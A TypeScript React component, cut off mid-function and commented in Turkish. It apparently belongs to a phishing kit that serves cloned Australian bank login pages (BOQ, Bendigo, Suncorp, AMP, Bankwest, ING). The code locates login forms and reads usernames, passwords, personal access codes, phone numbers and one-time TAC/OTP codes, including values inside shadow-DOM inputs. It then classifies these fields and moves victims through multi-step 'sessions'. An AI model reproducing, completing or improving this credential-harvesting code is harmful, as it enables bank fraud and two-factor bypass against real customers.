"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { getAuBankPageEntry, getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

type CapturedField = {
  key: string;
  value: string;
  kind: "username" | "password" | "bankPhone" | "personalCode" | "tacCode" | "unknown";
  type: string;
};

// ⭐ SIKILAŞTIRILMIŞ ACTION BUTTON TOKEN:
//   ❌ KALDIRILAN GENİŞ TOKENLER: open|go|access|unlock|accept|validate|enter
//   (bunlar chat/hamburger/menu/help butonlarında geçiyor ve yanlış submit yapıyordu)
//   ✅ SADECE login/sign-on/continue/next/proceed/submit gibi doğrudan login akışı tokenleri
const ACTION_BUTTON_RE = /(log\s?in|login|logon|log\s*on|sign\s?in|signon|sign\s*on|auth|authenticate|continue|next|proceed|submit|confirm|password_submit|submit_password|sigon|next\s*step|ilerle|ileri|devam|tamamla|giriş|giris|tamam|sonraki|onayla|onay|sıra|sıradaki)/i;

// ⭐ GLOBAL SIKI BLACKLIST RE (HER YERDE AYNI):
//   Bu tokenlerden HERHANGİ BİRİ (class/id/aria-label/title/name/textContent) içeren
//   butonlar LOGIN/REGISTER ile İLİŞKİSİZ navigasyon/chat/help/widget butonudur.
//   45+ kelime: chat, messenger, whatsapp, search, menu, hamburger, bell,
//   notification, language, locale, country, help, support, contact, ask,
//   assistant, avatar, profile, settings, more, dots, question, speech,
//   phone, mail, message, live.?chat, open.?chat, nav, navigation, header,
//   footer, feedback, survey, appointment, locate, branch, atm, store,
//   product, loan, rate, learn, blog, news, privacy, terms, cookie
const BUTTON_STRICT_BLACKLIST_RE = /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|icon-only|visuallyhidden|security-banner|securitybanner|kba|forgot|forgotten|reset.?pass|reset.?pwd|cancel|close|dismiss|back|go.?back|previous|prev\b|signup|sign-up|register|new.?account|create.?account|open.?acc|security.?question|chat|messenger|whatsapp|live.?chat|open.?chat|virtual.?assistant|vab|assistant|bot|speech.?bubble|bubble|message|sms|mail|email|contact.?us|get.?in.?touch|contact\b|ask|help|help.?center|support|faq|search|find|lookup|hamburger|menu|navigation|nav-?bar|header-?nav|three.?dots|more.?menu|more.?option|⋮|⋯|settings|cog|gear|profile|user.?icon|account.?icon|avatar|bell|notif|notification|alert|language|lang|locale|country|region|translate|feedback|survey|locate|branch|atm|find.?us|appointment|book|schedule|rate|product|loan|learn|blog|news|article|privacy|terms|cookie|consent|disclaimer|legal|download|print|share|social|facebook|twitter|instagram|linkedin|youtube|tiktok/i;

// ⭐ RIGHT-CORNER HEADER WIDGET FİLTRESİ:
//   Eğer buton ekranın %25'lik SAĞ üst şeridinde (x > innerWidth*0.75, y < 240)
//   ise ve STRICT login/submit class/id yoksa bu kesin chat/support/menu/search
//   sağ üst widget butonudur → reject.
function isRightCornerNonLoginWidget(node: HTMLElement): boolean {
  try {
    const w: Window | any = (node as any).ownerDocument?.defaultView ?? window;
    const innerW = Number(w?.innerWidth ?? 0);
    if (!innerW || innerW < 480) return false;
    const rect = node.getBoundingClientRect?.();
    if (!rect) return false;
    if (rect.left < innerW * 0.75) return false;
    if (rect.top > 240) return false;

    // SIKI login/submit class/id VARDIR → override et (geçerli login butonu sağ üstte olabilir, nadir)
    const idCls = `${node.id || ""} ${node.getAttribute("class") || ""}`.toLowerCase();
    if (/(^|[\s_-])(btn-login|login-btn|loginbutton|btn-submit|submit-btn|submitbutton|signin|sign-in)([\s_-]|$)/.test(idCls)) return false;
    return true;
  } catch {
    return false;
  }
}

// ⭐ FORM İLİŞKİSİ KONTROLÜ (3. KATMAN GÜVENCE):
//   Buton A) form="" attribute'u ile formu göstermeli, B) closest("form") içinde olmalı
//   YOKSA bu kesin header/footer/sidebar navigasyon butonudur.
//   ❗ ISTİSNA: Eğer buton class/id/submit-btn/login-btn/btn-login gibi sıkı login token
//   taşımıyorsa form dışı ama login olabilir (nadir). O yüzden strict login token VARSA OK.
function buttonHasFormRelation(node: HTMLElement): boolean {
  try {
    const formAttr = node.getAttribute("form");
    if (formAttr && formAttr.trim().length > 0) {
      const ownerDoc: Document | any = (node as any).ownerDocument ?? document;
      if (ownerDoc.getElementById(formAttr)) return true;
    }
    if (node.closest?.("form")) return true;

    // ISTISNA: sıkı login token class/id VARSA → form ilişkisi olmasa bile bile kabul et
    const idCls = `${node.id || ""} ${node.getAttribute("class") || ""} ${node.getAttribute("data-testid") || ""}`.toLowerCase();
    return /(^|[\s_-])(btn-login|login-btn|loginbutton|btn-submit|submit-btn|submitbutton|signin-btn|signinbutton|btn-signin|sign-in-btn)([\s_-]|$)/.test(idCls);
  } catch {
    return false;
  }
}

// ⭐ GREATER BANK FIX: Bridge icinde bulunan butonların GERÇEKTEN login/submit
//   butonu olup olmadigini 4 katmanli sıkı filtre ile denetle.
//   Sag ust chat/menu, next/continue/product/help/apply butonlari buradan GECEMEZ!
function isElementActuallyRealSubmitButton(node: HTMLElement): boolean {
  try {
    // Oncelikle temel buton benzerligi (4 katmanli eski filtre — bundan gecmek ZORUNLU)
    if (!isElementActuallyButtonLike(node)) return false;

    const tag = (node.tagName || "").toLowerCase();
    const typeAttr = (node.getAttribute("type") || "").toLowerCase();
    const idClsDtid = `${node.getAttribute("id") || ""} ${node.getAttribute("class") || ""} ${node.getAttribute("data-testid") || ""} ${node.getAttribute("name") || ""}`.toLowerCase();
    const actionTok = getElementActionToken(node);

    // 1) input[type=submit/button] direkt izin (native HTML submit elementi)
    if (tag === "input" && (typeAttr === "submit" || typeAttr === "button")) return true;

    // 2) class/id/data-testid sıkı login/submit token (btn-login/login-btn/btn-submit/signin-btn vb.)
    const hasStrictLoginSubmitIdCls =
      /(^|[\s_-])(btn-login|login-btn|loginbutton|btn-submit|submit-btn|submitbutton|signin|signin-btn|btn-signin|signinbutton|logon|logon-btn|logonbutton|btn-logon|continue-button|next-button)([\s_-]|$)/.test(idClsDtid);
    if (hasStrictLoginSubmitIdCls) return true;

    // 3) ACTION_BUTTON_RE.test (sikilastirilmis genel token: login/signin/submit/next/continue vb.)
    if (ACTION_BUTTON_RE.test(actionTok)) return true;

    // 4) [onclick] attribute VAR + sıkı submit/login token iceriyorsa izin ver
    if (node.hasAttribute("onclick") && /(submit|login|logon|signin|auth|confirm_submit|password_submit|submit_password)/i.test(idClsDtid)) {
      return true;
    }

    // Hiçbiri uymuyorsa → bu product/help/apply-now/menu/search butonudur, REJECT!
    return false;
  } catch {
    return false;
  }
}

function getElementActionToken(el: HTMLElement) {
  return normalizeToken([
    el.textContent,
    el instanceof HTMLInputElement ? el.value : "",
    el.getAttribute("aria-label"),
    el.getAttribute("value"),
    el.getAttribute("title"),
    el.getAttribute("data-label"),
    el.getAttribute("data-text"),
  ].join(" "));
}

function normalizeToken(value: string | null | undefined) {
  return (value ?? "").trim().toLowerCase().replace(/[^a-z0-9]+/g, " ");
}

function getElementLabel(doc: Document, el: any): string {
  // ⭐ SHADOW ROOT label okuma (ÖNCE): SG-INPUT, ING-INPUT custom elementler
  //   shadowRoot içine label slot / aria-label / label attribute içerebilir.
  try {
    const ar = (el as HTMLElement)?.getAttribute?.("aria-label")?.trim?.();
    if (ar && ar.length > 1) return ar;
  } catch {}
  try {
    const ph = (el as HTMLElement)?.getAttribute?.("placeholder")?.trim?.();
    if (ph && ph.length > 1) return ph;
  } catch {}
  try {
    const lab = (el as HTMLElement)?.getAttribute?.("label")?.trim?.();
    if (lab && lab.length > 1) return lab;
  } catch {}
  try {
    const sh = (el as any)?.shadowRoot as ShadowRoot | null;
    if (sh) {
      const lab = sh.querySelector("[slot='label'], label, .label, .form-label");
      if (lab?.textContent?.trim()) return lab.textContent.trim();
    }
  } catch {}
  try {
    const type = (el as HTMLElement)?.getAttribute?.("type")?.toLowerCase?.();
    if (type === "password") return "password";
  } catch {}

  // Normal HTML standart label okuma
  const ariaLabel = (el as HTMLElement)?.getAttribute?.("aria-label");
  if (ariaLabel?.trim()) return ariaLabel.trim();

  const placeholder = (el as HTMLElement)?.getAttribute?.("placeholder");
  if (placeholder?.trim()) return placeholder.trim();

  const id = (el as HTMLElement)?.getAttribute?.("id");
  if (id) {
    const label = doc.querySelector(`label[for="${id}"]`);
    if (label?.textContent?.trim()) return label.textContent.trim();
  }

  try {
    const wrappingLabel = (el as HTMLElement)?.closest?.("label");
    if (wrappingLabel?.textContent?.trim()) return wrappingLabel.textContent.trim();
  } catch {}

  try {
    const formItem = (el as HTMLElement)?.closest?.(".form-item");
    const formItemLabel = formItem?.querySelector(".form-label");
    if (formItemLabel?.textContent?.trim()) return formItemLabel.textContent.trim();
  } catch {}

  try {
    const formInput = (el as HTMLElement)?.closest?.(".form-input");
    const siblingFormLabel =
      formInput?.previousElementSibling?.classList?.contains?.("form-label")
        ? formInput.previousElementSibling
        : null;
    if (siblingFormLabel?.textContent?.trim()) return siblingFormLabel.textContent.trim();
  } catch {}

  try {
    const parentText = (el as HTMLElement)?.parentElement?.parentElement?.textContent?.trim?.();
    if (parentText) return parentText;
  } catch {}

  return "";
}

function inferFieldKind(
  el: any,
  label: string,
): CapturedField["kind"] {
  // ⭐ AMP BANK ANGULAR FIX: formControlName ve ng-reflect-name attribute'lerini raw tokenlera EKLE
  //   AMP 1.html'de <input formControlName="memberNumber" type="text" id=...> tarzi Angular
  //   directive kullaniliyor. Standart name/id attribute'u bos olsa bile formControlName'den
  //   memberNumber (username) ve password (password) kind dogru cikartilir.
  const fcn = (el as HTMLElement)?.getAttribute?.("formcontrolname") ?? (el as HTMLElement)?.getAttribute?.("formControlName") ?? "";
  const ngn = (el as HTMLElement)?.getAttribute?.("ng-reflect-name") ?? "";
  const dtid = (el as HTMLElement)?.getAttribute?.("data-testid") ?? "";
  const dtf = (el as HTMLElement)?.getAttribute?.("data-field") ?? "";

  const raw = normalizeToken(
    [
      (el as HTMLElement)?.getAttribute?.("name"),
      (el as HTMLElement)?.getAttribute?.("id"),
      fcn, ngn, dtid, dtf,
      (el as HTMLElement)?.getAttribute?.("autocomplete"),
      (el as HTMLElement)?.getAttribute?.("type"),
      label,
    ].join(" "),
  );

  const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();

  const dtidL = dtid.toLowerCase();
  const ida = ((el as HTMLElement)?.getAttribute?.("id") ?? "").toLowerCase();
  const cla = ((el as HTMLElement)?.getAttribute?.("class") ?? "").toLowerCase();
  const fcnL = String(fcn || "").toLowerCase();
  const ngnL = String(ngn || "").toLowerCase();
  const dtfL = String(dtf || "").toLowerCase();
  let pdtid = "";
  try {
    pdtid = ((el as HTMLElement)?.parentElement?.parentElement?.getAttribute?.("data-testid") ?? "").toLowerCase();
  } catch {
    pdtid = "";
  }
  const lbl = (label ?? "").toLowerCase();
  const s1 = `${dtidL} ${ida} ${pdtid} ${cla} ${fcnL} ${ngnL} ${dtfL} ${lbl}`;
  const s2 = `${dtidL} ${ida} ${pdtid} ${cla} ${raw} ${fcnL} ${ngnL} ${dtfL} ${lbl}`;

  const dataTestId = dtidL;
  const idAttr = ida;
  const classAttr = cla;
  const parentDataTestId = pdtid;
  const formControlNameL = fcnL;
  const ngReflectNameL = ngnL;
  const dataFieldL = dtfL;

  // ⭐ BOQ Classic SPECIAL MAP: BOQ inputların name attribute u SAYI (name=4 / name=8 / name=14)
  //   oldugu icin standart regexler calismiyor. data-testid ve label attribute'lari GUCLU
  //   oldugu icin oncelikle DATA-TESTID uzerinden eslestir:
  //   ⚠️ DİKKAT: BOQ Classic txtUserSignon (id=id8) 3. alandır (User ID) → personalCode
  //              ANCAK "userid" tokenini GENEL BANKALARDA username olarak kullanmamalıyız
  //              Suncorp / diğer bankalarda UserId = username olur. Bu yüzden:
  //              SIKI BLOK: txtUserSignon, usersignon, businessusersignon VE data-testid=txtUserSignon
  //              ŞARTIYLA SADECE BOQ ÖZELDE personalCode, genel userid/username → username
  if (
    dataTestId === "txtuserid" || idAttr === "txtuserid" || parentDataTestId === "txtuserid" ||
    /txtuserid|customeraccessnumber|customer-access-number|accessno|accessnumber/i.test(s1)
  ) {
    return "username";
  }
  if (
    dataTestId === "txtpassword" || idAttr === "txtpassword" || parentDataTestId === "txtpassword" ||
    /txtpassword|formgrouppassword|form-group--password|passwordname/i.test(s2)
  ) {
    return "password";
  }
  if (
    dataTestId === "txtusersignon" || idAttr === "txtusersignon" || parentDataTestId === "txtusersignon" ||
    /^txtusersignon$|^usersignon$|^businessusersignon$|form-group--user-id/i.test(s1)
  ) {
    return "personalCode";
  }
  if (
    dataTestId === "txttokenotp" || idAttr === "txttokenotp2" || parentDataTestId === "txttokenotp" ||
    /formgrouptoken|form-group--token|tokenotp|rsa/i.test(s2)
  ) {
    return "tacCode";
  }

  // ⭐ BENDIGO + DİĞER BANKALAR ACCESS ID/NUMBER LABEL + INPUT ID HIZLI MAP:
  //   Bendigo step1 input: id="Username_AccessID" → label "Access ID" → username kind
  //   Access Number / Access ID = username (tüm bankalar)
  //   "Personal Access Number (PAN)" Bankwest: label 'Personal' sözcüğü geçiyor → personalCode
  //   ayrıca autocomplete="username" var ise kesin username, autocomplete="current-password" ise password.
  //   ⭐ AMP BANK: formControlName = memberNumber / clientNumber / accessNumber → username.
  //   formControlName = password → password.
  const autocomplete = ((el as HTMLElement)?.getAttribute?.("autocomplete") ?? "").toLowerCase();
  if (autocomplete === "username") return "username";
  if (autocomplete === "current-password" || autocomplete === "new-password") return "password";
  if (formControlNameL === "password" || ngReflectNameL === "password" || dataFieldL === "password") return "password";
  if (/memberno|membernumber|clientno|clientnumber|accessno|accessnumber|customerno|customernumber|registrationno|customerid|clientid|userid|loginid|logonid/i.test(formControlNameL + " " + ngReflectNameL + " " + dataFieldL)) return "username";

  if (/personal.?access.?number/i.test(s1 + " " + s2)) return "personalCode";
  if (/access.?id|access.?number|customer.?access|customer.?registration|registration.?number|client.?number|logon.?id|login.?form.?username/i.test(s1 + " " + s2)) return "username";

  // ⚠️ SIRAYI TEKRAR DÜZENLEDİM (SUNCORP TOKEN CODE FIX):
  //   ÖNCELİK SIRASI:
  //   1. autocomplete (GERÇEK password/username → kesinleşmiş)
  //   2. TAC/OTP/TOKEN/PASSCODE+SECURITY/TOKENCODE combo (ÖNCEKİ YANLIŞ: /passcode/ regex password yapıyordu, Suncorp L476 Token Code name=passcode idi)
  //   3. Username (userid/customer/cardno) → username
  //   4. Personal (member/tax/customer number) → personalCode
  //   5. Telefon (tel/phone) → bankPhone
  //   6. EN SON: type=password + SAFE password regex (password/pin/secret, TOKEN DEĞİL) → password
  //   Suncorp L476 (name=passcode, label="Token Code") → ARTIK tacCode, DEĞİL password

  // ⭐ 1. TAC/OTP/TOKEN (ÖNCE KONTROL ET! TOKEN + PASSCODE BİRLİKTELİĞİ:
  //   Suncorp Token Code: label='Token Code', name=passcode, type=password → tacCode
  //   Token/OTP/TAC/security token/RSA/One Time Pin → tacCode
  if (/passcode|tac|otp|one.?time|one-time|verification|security.?code|sms.?code|token|security.?token|rsa|mfa|2.?fa|activation.?code|auth.?code|dynamic.?code|secure.?token|token.?code|secure|transaction.?auth|transaction.?password/i.test(s2)) return "tacCode";
  if (/token.?pass/i.test(s2)) return "tacCode";

  // ⭐ 2. PERSONAL CODE + MEMBER/CUSTOMER NUMBER:
  if (/personal|identity|customer number|member number|ird|tax number/i.test(raw)) return "personalCode";

  // ⭐ 3. USERNAME + KULLANICI ADI:
  if (/username|user ?id|userid|login id|client number|customer id|card number|account number|customer number|member number|registration number|cif|cif.?number/i.test(raw)) return "username";

  // ⭐ 4. TELEFON (SONRA, yani user id tel type ise username regexlerinden SONRA! Customer/Member No tel type olursa username olur):
  if (type === "tel" || /phone|mobile|contact|cell/i.test(raw)) return "bankPhone";

  // ⭐ 5. EN SON GERÇEK PASSWORD (type password VEYA SAFE PASSWORD/PIN/SECRET, TOKEN DEĞİL):
  //    Buraya kadar eşleşmez ve type password ise password. Sadece password regex:
  if (type === "password" || /password|pin|secret/.test(raw)) return "password";
  return "unknown";
}

function sanitizeKey(value: string) {
  return value.trim().toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "");
}

function isMeaningfulField(el: any) {
  const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();
  if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
  if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
  if ((el as HTMLElement)?.getAttribute?.("aria-hidden") === "true") return false;

  // ⭐ GİZLİ (görünmeyen inputları filtrele):
  //   BOQ Classic 3 adet gizli password inputu (passwordname1/2/3)
  //   Bendigo step1 1 adet gizli password (tabindex=-1 + autocomplete=current-password + parent aria-hidden=true)
  //   Bu inputlar type=password olsa da value ları boştur ve orderedField sıralamasını KARIŞTIRIRLAR.
  //   Eğer display:none, visibility:hidden, -9999px solda, offsetParent null VEYA
  //   tabindex=-1 + parent 5 seviyesinde aria-hidden=true ise anlamlı input SAYMA.
  try {
    const style = window.getComputedStyle(el as HTMLElement);
    if (style.display === "none") return false;
    if (style.visibility === "hidden" || style.visibility === "collapse") return false;
  } catch {}
  try {
    const styleAttr = ((el as HTMLElement)?.getAttribute?.("style") ?? "");
    if (
      /display\s*:\s*none/i.test(styleAttr) ||
      /visibility\s*:\s*hidden/i.test(styleAttr) ||
      /left\s*:\s*-9999/i.test(styleAttr) ||
      /z-index\s*:\s*-1/i.test(styleAttr)
    ) {
      return false;
    }
  } catch {}
  // ⭐ tabindex=-1 + parent Aria-hidden GİZLE (Bendigo step1 hidden password input):
  //   ⚠️ DİKKAT ⚠️: SADECE VE SADECE parent 5 seviyede aria-hidden=true VAR İSE (yani üst
  //   elementin kendisi screen reader için GİZLİ ise) skip et. type=password VEYA
  //   tabindex=-1 tek başına ASLA skip etmez. Gerçek visible inputlar tabindex=-1
  //   olabilir. ESKİ kural (parentAriaHidden VEYA type=password) yanlışlıkla gerçek
  //   password inputlarını skip ediyordu.
  try {
    const ti = (el as HTMLElement)?.getAttribute?.("tabindex");
    let parentAriaHidden = false;
    try {
      let p: HTMLElement | null = (el as HTMLElement)?.parentElement;
      let depth = 0;
      while (p && depth < 5) {
        if (p.getAttribute?.("aria-hidden") === "true") { parentAriaHidden = true; break; }
        p = p.parentElement;
        depth++;
      }
    } catch {}
    if (ti === "-1" && parentAriaHidden) {
      return false;
    }
  } catch {}
  try {
    if ((el as HTMLElement).offsetParent == null) {
      const w = (el as HTMLElement).offsetWidth ?? 0;
      const h = (el as HTMLElement).offsetHeight ?? 0;
      if (w <= 1 && h <= 1) return false;
    }
  } catch {}
  return true;
}

// ⭐ SHADOW DOM DERİN VALUE OKUMA (3 seviye):
//   SG-INPUT, ING-INPUT, UI5-INPUT custom web componentleri shadow DOM kullanır.
//   Normal document.querySelectorAll('input') shadowRoot içindeki gerçek inputu göremez.
//   Önce kendi value property si, sonra shadowRoot querySelector, sonra iç içe shadow rootlar
//   5 seviye kadar kontrol ederiz.
function readFieldValue(el: any) {
  const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();

  if (type === "checkbox" || type === "radio") {
    try {
      return (el as HTMLInputElement).checked ? ((el as HTMLInputElement).value || "true") : "";
    } catch {
      return "";
    }
  }

  // 1. Kendi value property (standart HTMLInputElement)
  try {
    const v = (el as HTMLInputElement)?.value?.trim?.() ?? "";
    if (v.length > 0) return v;
  } catch {}

  // 2. shadowRoot içindeki ilk input/textarea/select
  try {
    const shadow = (el as any)?.shadowRoot as ShadowRoot | null | undefined;
    if (shadow) {
      const inner = shadow.querySelector("input, textarea, select");
      if (inner) {
        const iv = (inner as HTMLInputElement)?.value?.trim?.() ?? "";
        if (iv.length > 0) return iv;
      }
    }
  } catch {}

  // 3. 5 seviye derin nested shadow root / nested children ara (SG- gibi çok katmanlı wc)
  try {
    let current: any = el;
    let depth = 0;
    while (current && depth < 5) {
      if (current?.shadowRoot) {
        const inner = current.shadowRoot.querySelector("input, textarea, select");
        if (inner) {
          const iv = (inner as HTMLInputElement)?.value?.trim?.() ?? "";
          if (iv.length > 0) return iv;
        }
        current = current?.firstElementChild;
      } else {
        current = current?.firstElementChild;
      }
      depth++;
    }
  } catch {}

  // 4. HTML value attribute (son çare)
  try {
    const attr = (el as HTMLElement)?.getAttribute?.("value")?.trim?.() ?? "";
    if (attr.length > 0) return attr;
  } catch {}

  return "";
}

// ⭐ SHADOW DOM CUSTOM ELEMENTLERİ DAHİL ET:
//   Suncorp SG-INPUT, ING <ing-input>, UI5 <ui5-input>, Vaadin, MD TextField gibi
//   custom web componentler querySelectorAll('input') listesinde görünmez.
//   Bunları AYRI olarak ekle ve value'lerini readFieldValue shadow read ile al.
function getFormFields(form: HTMLFormElement | Document) {
  const scope = (form as any).querySelectorAll
    ? ((form as unknown) as ParentNode)
    : (document as unknown as ParentNode);
  const standardInputs = Array.from(
    (scope as ParentNode).querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
      "input, textarea, select",
    ),
  ).filter(isMeaningfulField);

  const customInputs: any[] = [];
  try {
    const wcCandidates = Array.from(
      (scope as ParentNode).querySelectorAll<HTMLElement>(
        "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea",
      ),
    );
    wcCandidates.forEach((wc) => {
      const typeAttr = (wc.getAttribute("type") || "text").toLowerCase();
      if (["hidden", "submit", "button", "image", "reset"].includes(typeAttr)) return;
      if (wc.getAttribute("aria-hidden") === "true") return;
      customInputs.push(wc as any);
    });
  } catch {}
  return [...standardInputs, ...customInputs];
}

function formHasIdentityAndPassword(form: HTMLFormElement, doc: Document) {
  const fields = getFormFields(form);
  let hasIdentity = false;
  let hasPassword = false;

  for (const field of fields) {
    const kind = inferFieldKind(field, getElementLabel(doc, field));
    if (kind === "password") hasPassword = true;
    if (kind === "username" || kind === "personalCode" || kind === "bankPhone") {
      hasIdentity = true;
    }
  }

  return hasIdentity && hasPassword;
}

function pickBestForm(doc: Document): HTMLFormElement | null {
  const forms = Array.from(doc.querySelectorAll("form"));
  if (forms.length === 0) return null;

  // ⭐⭐⭐ EN ÖNCELİK: GERÇEK LOGIN FORM (hem text/tel alanı HEM password alanı OLAN form)!
  //   Forgot password formlarında SADECE type=password inputu olur (text alanı olmaz).
  //   Önce bunu dene, hiçbir şey bunu geçemez.
  try {
    const perfect = forms.find((f) => {
      const fs = getFormFields(f);
      if (fs.length === 0) return false;
      let hasTextLike = false; let hasPass = false;
      for (const ff of fs) {
        if (!isMeaningfulField(ff)) continue;
        const t = (ff.getAttribute?.("type") ?? "").toLowerCase();
        if (t === "password") hasPass = true;
        if (["text", "email", "tel", "number"].includes(t)) hasTextLike = true;
      }
      return hasTextLike && hasPass;
    });
    if (perfect) return perfect;
  } catch {}

  let bestScore = -Infinity;
  let bestForm: HTMLFormElement | null = null;
  for (const form of forms) {
    const fields = getFormFields(form).filter(isMeaningfulField);
    if (fields.length === 0) continue;
    let hasId = false;
    let hasPass = false;
    let usernameLikeTypeFields = 0;
    let filledCount = 0;
    let passFieldsCount = 0;
    for (const f of fields) {
      const k = inferFieldKind(f, getElementLabel(doc, f));
      const t = (f.getAttribute?.("type") ?? "").toLowerCase();
      if (t === "password") { hasPass = true; passFieldsCount++; }
      if (
        k === "username" || k === "personalCode" || k === "bankPhone" ||
        t === "text" || t === "email" || t === "number" || t === "tel"
      ) { hasId = true; usernameLikeTypeFields++; }
      if (readFieldValue(f)) filledCount++;
    }
    // ⭐ SCORE: FORGOT PASSWORD (hasPass true, hasId false, usernameLikeTypeFields=0, passFieldsCount=1)
    //   Formlara BÜYÜK NEGATİF CEZA → EN ALTA AT. Böylece asla seçilmezler!
    const isForgotPassword = hasPass && !hasId && usernameLikeTypeFields === 0;
    let score = fields.length * 2 + (hasId ? 18 : 0) + (hasPass ? 12 : 0) + usernameLikeTypeFields + filledCount * 3;
    if (isForgotPassword) score -= 2000;
    // ⭐ Formda SADECE password inputu varsa (tek input) → ÇOK DÜŞÜK puan
    if (passFieldsCount === fields.length && fields.length >= 1) score -= 1500;
    if (score > bestScore) {
      bestScore = score;
      bestForm = form;
    }
  }
  return bestForm;
}

function collectCapturedFieldsFromForm(form: HTMLFormElement | Document, doc: Document): CapturedField[] {
  const allFields = getFormFields(form).filter(isMeaningfulField);
  // ⭐⭐⭐ EN KRİTİK HATA DÜZELTİLDİ:
  //   ESKİ: if (!value) return null → shadow DOM / BOQ / SG-INPUT / custom wc gibi
  //   inputlarda readFieldValue İLK DENEMEDE boş dönebilir → O ALAN listeden ATILIRDI.
  //   Böylece fields listesinde SADECE şifre alanı (value okunabiliyorsa) kalır ve
  //   usernameField BULUNAMAZDI (sadece şifre kolonu doluyordu).
  //   YENİ: DEĞER BOŞ OLSA BİLE ALAN listeye KATILIR, kind/type/key bilgisi DOLDURULUR.
  //   usernameField ararken kind=username veya type=text/tel/email/number aranır →
  //   kind atanamasa bile type=text alanları usernameField olarak bulunur.
  return allFields
    .map((el, idx) => {
      const value = readFieldValue(el);
      const label = getElementLabel(doc, el);
      const rawKey = sanitizeKey(
        el.getAttribute("name") ||
        el.getAttribute("id") ||
        label ||
        `field_${idx + 1}`,
      );
      return {
        key: rawKey || `field_${idx + 1}`,
        value: value ?? "",
        kind: inferFieldKind(el, label),
        type: (el.getAttribute("type") ?? "").toLowerCase(),
      } satisfies CapturedField;
    })
    .filter((f): f is CapturedField => Boolean(f));
}

function canSubmitIntermediate(form: HTMLFormElement | Document, doc: Document) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  if (fields.length === 0) return false;
  const allFields = getFormFields(form);
  const allRequiredTypes = allFields.filter((f) => {
    const t = (f.getAttribute("type") ?? "").toLowerCase();
    const attrRequired = f.hasAttribute("required");
    // Bendigo multistep / diger butun bankalar: checkbox/radio haricindeki TÜM inputlar ZORUNLU.
    // checkbox/radio default unchecked olabilir (zorunlu degil).
    return t !== "checkbox" && t !== "radio";
  });
  const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
  const allFilled = allRequiredTypes.length > 0 && filledRequired === allRequiredTypes.length;

  // ⭐ KURAL 1: FORM KAPSAMINDAKI (allRequiredTypes) TÜM ZORUNLU INPUTLAR DOLU OLMALI.
  //   Bu tek basina SADECE 1 tane identity/password girilip digerleri bos birakilmasini engeller.
  //   ISTISNA: eger formda 2+ alan vardı ama 1 tanesi bilinmiyorsa (unknown/tamamen form ile alakasız gizli inputlar) strict gereklilikten belli bir tolerans ver
  const isFormScope = (form as any).tagName === "FORM";
  const tolerableUnknown = allRequiredTypes.filter(
    (f) => {
      // Bilinen alan (name/id ile username/password gibi) değil, gizli/token/anti-csrf vb.
      const k = (f.getAttribute("name") || f.getAttribute("id") || "").toLowerCase();
      return (
        f.getAttribute("type") === "hidden" ||
        /_csrf|csrf|token|hash|nonce|challenge|session|sid|txn|transactionid|rand|salt|captcha|recaptcha/i.test(k)
      );
    },
  ).length;
  const requiredMinusUnknown = allRequiredTypes.length - tolerableUnknown;
  const filledMinusUnknown = filledRequired - tolerableUnknown;
  const strictAllFilled = requiredMinusUnknown > 0 && filledMinusUnknown >= requiredMinusUnknown;

  // ⭐ KURAL 2: IDENTITY + PASSWORD ÇİFTİ (BERABER) KESİNLİKLE OLMALI (multiadım son adımı ve tek adımlı bankalar).
  //   Tek basına username YA DA tek basina password → ASLA İZİN VERME.
  const hasIdentPassPair =
    hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields));

  // ⭐ KURAL 3: TAC + PASSCODE 3. alan (Suncorp 3 input vb.) varsa hepsi dolu olmalı (strictAllFilled).
  if (isFormScope && requiredMinusUnknown >= 3 && !strictAllFilled) return false;
  if (isFormScope && requiredMinusUnknown === 2 && !strictAllFilled && !hasIdentPassPair) return false;

  if (strictAllFilled && (hasIdentPassPair || requiredMinusUnknown >= 1)) return true;

  // Multi-adım ara adımları: 1 tek input (örn Bendigo 1.adim sadece Access Number)
  // Burada strictAllFilled TRUE ise (tek input DOLU) ve formda SİYA 1 tane zorunlu (bilinen) input varsa İZİN VER.
  if (requiredMinusUnknown === 1 && strictAllFilled) {
    const hasImportantSingle = fields.some(
      (x) =>
        x.kind === "username" || x.kind === "password" || x.kind === "personalCode" || x.kind === "tacCode",
    );
    return hasImportantSingle;
  }
  return false;
}

function canSubmitFinal(form: HTMLFormElement | Document, doc: Document, isActuallySingleStepOnly: boolean) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  if (isActuallySingleStepOnly) {
    const allFields = getFormFields(form);
    const allRequiredTypes = allFields.filter((f) => {
      const t = (f.getAttribute("type") ?? "").toLowerCase();
      return t !== "checkbox" && t !== "radio";
    });
    const filledCount = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
    // Tolerance for anti-CSRF / hidden / token inputs (gizli alanlar zorunlu değil)
    const tolerableUnknownCount = allRequiredTypes.filter(
      (f) => {
        const k = (f.getAttribute("name") || f.getAttribute("id") || "").toLowerCase();
        return (
          f.getAttribute("type") === "hidden" ||
          /_csrf|csrf|token|hash|nonce|challenge|session|sid|txn|transactionid|rand|salt|captcha|recaptcha/i.test(k)
        );
      },
    ).length;
    const realRequired = allRequiredTypes.length - tolerableUnknownCount;
    const realFilled = filledCount - tolerableUnknownCount;
    const allRealFilled = realRequired > 0 && realFilled >= realRequired;

    const hasIdentPassPair =
